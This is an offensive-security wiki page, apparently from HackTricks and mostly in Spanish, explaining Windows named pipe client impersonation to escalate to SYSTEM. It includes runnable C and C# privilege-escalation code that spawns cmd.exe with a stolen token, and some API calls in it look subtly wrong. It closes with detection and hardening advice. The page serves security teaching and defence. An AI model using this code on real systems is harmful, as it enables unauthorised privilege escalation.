# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation es un primitivo de escalada de privilegios local que permite a un hilo servidor de named-pipe adoptar el contexto de seguridad de un cliente que se conecta a él. En la práctica, un atacante que puede ejecutar código con SeImpersonatePrivilege puede forzar a un cliente privilegiado (p. ej., un servicio SYSTEM) a conectarse a una pipe controlada por el atacante, llamar a ImpersonateNamedPipeClient, duplicar el token resultante a un token primario y crear un proceso como el cliente (a menudo NT AUTHORITY\SYSTEM).

Esta página se centra en la técnica principal. Para cadenas de explotación end-to-end que coaccionen a SYSTEM a conectarse a tu pipe, consulta las páginas de la familia Potato referenciadas más abajo.

## TL;DR
- Crear una named pipe: \\.\pipe\<random> y esperar a una conexión.
- Hacer que un componente privilegiado se conecte a ella (spooler/DCOM/EFSRPC/etc.).
- Leer al menos un mensaje de la pipe, luego llamar a ImpersonateNamedPipeClient.
- Abrir el token de impersonación del hilo actual, DuplicateTokenEx(TokenPrimary), y CreateProcessWithTokenW/CreateProcessAsUser para obtener un proceso SYSTEM.

## Requisitos y APIs clave
- Privilegios que típicamente necesita el proceso/hilo que llama:
- SeImpersonatePrivilege para impersonar con éxito a un cliente que se conecta y para usar CreateProcessWithTokenW.
- Alternativamente, tras impersonar a SYSTEM, puedes usar CreateProcessAsUser, que puede requerir SeAssignPrimaryTokenPrivilege y SeIncreaseQuotaPrivilege (estos se satisfacen cuando estás impersonando a SYSTEM).
- APIs principales utilizadas:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (must read at least one message before impersonation)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: para realizar acciones útiles localmente, el cliente debe permitir SecurityImpersonation (valor por defecto para muchos clientes RPC/named-pipe locales). Los clientes pueden reducir esto con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION al abrir la pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
- Si ImpersonateNamedPipeClient devuelve ERROR_CANNOT_IMPERSONATE (1368), asegúrate de leer del pipe primero y de que el cliente no haya restringido la impersonación al nivel Identification.
- Prefiere DuplicateTokenEx con SecurityImpersonation y TokenPrimary para crear un token primario adecuado para la creación de procesos.

## .NET ejemplo rápido
En .NET, NamedPipeServerStream puede impersonar mediante RunAsClient. Una vez que se impersona, duplica el token del hilo y crea un proceso.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Disparadores/coerciones comunes para llevar SYSTEM a tu pipe
Estas técnicas coaccionan servicios privilegiados para que se conecten a tu named pipe y así puedas impersonatearlos:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Consulta el uso detallado y la compatibilidad aquí:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Si solo necesitas un ejemplo completo de cómo crear la pipe e impersonar para spawnear SYSTEM desde un service trigger, consulta:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Solución de problemas y advertencias
- Debes leer al menos un mensaje desde la pipe antes de llamar a ImpersonateNamedPipeClient; de lo contrario obtendrás ERROR_CANNOT_IMPERSONATE (1368).
- Si el cliente se conecta con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, el servidor no puede impersonatear completamente; verifica el nivel de impersonation del token vía GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requiere SeImpersonatePrivilege en el llamador. Si falla con ERROR_PRIVILEGE_NOT_HELD (1314), usa CreateProcessAsUser después de que ya hayas impersonateado SYSTEM.
- Asegúrate de que el security descriptor de tu pipe permita al servicio objetivo conectarse si lo endureces; por defecto, las pipes bajo \\.\pipe son accesibles según la DACL del servidor.

## Detección y hardening
- Monitoriza la creación y las conexiones a named pipes. Los Sysmon Event IDs 17 (Pipe Created) y 18 (Pipe Connected) son útiles para establecer una línea base de nombres de pipe legítimos y detectar pipes inusuales, con apariencia aleatoria, que preceden a eventos de manipulación de tokens.
- Busca secuencias: un proceso crea una pipe, un servicio SYSTEM se conecta, y luego el proceso creador genera un hijo como SYSTEM.
- Reduce la exposición quitando SeImpersonatePrivilege de cuentas de servicio no esenciales y evitando logons de servicio innecesarios con privilegios altos.
- Desarrollo defensivo: al conectarte a named pipes no confiables, especifica SECURITY_SQOS_PRESENT con SECURITY_IDENTIFICATION para evitar que los servidores impersonateen completamente al cliente salvo que sea necesario.

## Referencias
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
